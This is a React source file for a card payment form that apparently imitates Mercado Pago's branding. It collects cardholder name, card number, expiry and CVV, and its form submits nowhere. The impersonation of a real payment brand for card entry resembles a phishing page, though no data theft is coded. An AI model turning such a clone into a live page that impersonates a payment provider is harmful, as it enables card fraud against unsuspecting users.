import logo from "./img/Mercado-Pago-Logo.png";
import { useState } from "react";
import logo2 from "./img/logo.png";

function App() {
  const [expiryDate, setExpiryDate] = useState("");

  const handleChange = (event) => {
    const { value } = event.target;
    let formattedValue = value.replace(/\D/g, ""); // Remover caracteres no numéricos
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2); // Agregar "/" después de los 2 primeros caracteres
    }
    setExpiryDate(formattedValue);
  };

  const [cardNumber, setCardNumber] = useState("");

  const handleChangeCard = (event) => {
    const { value } = event.target;
    const formattedValue = value.replace(/\s/g, ""); // Remover espacios

    let spacedValue = null;
    if (formattedValue.length > 0) {
      spacedValue = formattedValue
        .match(/.{1,4}/g) // Agrupar los números en bloques de 4 caracteres
        .join(" "); // Agregar un espacio entre cada bloque
    }

    setCardNumber(spacedValue);
  };

  const [inputValue, setInputValue] = useState("");

  const handleChangeCode = (event) => {
    const { value } = event.target;
    const formattedValue = value.slice(0, 3); // Limitar a 3 caracteres
    setInputValue(formattedValue);
  };

  return (
    <div className="mainContainer bg-[#eeeeee]">
      <nav className="border-gray-200 bg-sky-600 dark:bg-gray-800 dark:border-gray-700">
        <div className="flex flex-wrap items-center justify-between mx-auto p-1 lg:p-1 xl:p-1">
          <a
            href="https://mercadopago.com.ar/"
            className="flex justify-between items-center"
          >
            <img src={logo} className="h-[88px]" alt="MpLogo" />
          </a>
          <button
            data-collapse-toggle="navbar-default"
            type="button"
            className="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600"
            aria-controls="navbar-default"
            aria-expanded="false"
          >
            <span className="sr-only">Open main menu</span>
            <svg
              className="w-6 h-6"
              aria-hidden="true"
              fill="currentColor"
              viewBox="0 0 20 20"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                fillRule="evenodd"
                d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z"
                clipRule="evenodd"
              ></path>
            </svg>
          </button>
          <div className="hidden w-full md:block md:w-auto" id="navbar-default">
            <ul className="font-medium flex flex-col p-4 md:p-0 mt-4 border rounded-lg md:hover:text-gray-50 md:flex-row md:space-x-8 md:mt-0 md:border-0">
              <li>
                <a
                  href="https://picsum.photos/seed/picsum/200/300"
                  className="block py-2 pl-3 pr-4 text-white rounded md:border-0 md:hover:text-gray-50"
                >
                  Ayuda
                </a>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <div className="h-full my-4 lg:my-32 mx-auto max-w-sm lg:max-w-lg p-4 bg-[#ffffff] border border-gray-200 rounded-lg shadow sm:p-6 md:p-8 dark:bg-gray-800 dark:border-gray-700">
        <form className="space-y-6" action="#">
          <div className="flex items-center">
            <div className="flex items-center">
              <h5 className="text-base font-bold leading-[1.35] font-sans text-gray-900 dark:text-white">
                Completá los datos de tu tarjeta
              </h5>
            </div>
          </div>
          <div>
            <h1 className="w-12 mb-1">Nombre&nbsp;del&nbsp;titular:</h1>
            <input
              type="email"
              name="email"
              id="email"
              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
              placeholder="Ingresa tu nombre"
              required
            />
          </div>
          <div>
            <h1 className="w-12 mb-1">Número&nbsp;de&nbsp;tarjeta:</h1>
            <input
              type="text"
              name="cosa"
              id="cosa"
              value={cardNumber}
              onChange={handleChangeCard}
              maxLength={19} // Permitir un máximo de 19 caracteres incluyendo los espacios
              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
              placeholder="1234 1234 1234 1234"
              required
            />
          </div>
          <div className="flex">
            <div className="mr-2">
              <h1 className="w-12 mb-1">Vencimiento</h1>

              <input
                type="text"
                value={expiryDate}
                onChange={handleChange}
                maxLength={5} // Limitar a 5 caracteres incluyendo la "/"
                className="bg-gray-50 border w-full md:w-[200px] border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                placeholder="MM/YY"
              />
            </div>
            <div>
              <h1 className="w-12 mb-1">CVV</h1>
              <input
                type="text"
                value={inputValue}
                onChange={handleChangeCode}
                maxLength={3} // Limitar a 3 caracteres
                className="bg-gray-50 border ml-4 md:ml-1 sm:ml-0 border-gray-300 text-gray-900 text-sm rounded-lg sm:w-[180px] md:w-[105px] lg:w-[233px] focus:ring-blue-500 focus:border-blue-500 p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
                placeholder="***"
              />
            </div>
          </div>

          <div>
            <h1 className="w-12 mb-1">Cuotas&nbsp;sin&nbsp;interés</h1>
            <select
              name="cuotas"
              id="cuotas"
              className="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-600 dark:border-gray-500 dark:placeholder-gray-400 dark:text-white"
              required
            >
              <option value="">Selecciona una opción</option>
              <option value="3">3 cuotas sin interés</option>
              <option value="6">6 cuotas sin interés</option>
              <option value="12">12 cuotas sin interés</option>
            </select>
          </div>
          <div className="flex items-start">
            <div className="flex items-start">
              <div className="flex items-center h-5"></div>
            </div>
            <button
              type="submit"
              className="text-white mx-auto bg-sky-600 hover:bg-blue-800 focus:ring-4 focus:outline-none focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 text-center dark:bg-blue-600 dark:hover:bg-blue-700 dark:focus:ring-blue-800"
            >
              Pagar
            </button>{" "}
          </div>
        </form>
      </div>
      <div className="additionalContent">
        {/* Contenido adicional que deseas que aparezca debajo de la lista */}
        <p>&nbsp;</p>
      </div>
    </div>
  );
}

export default App;
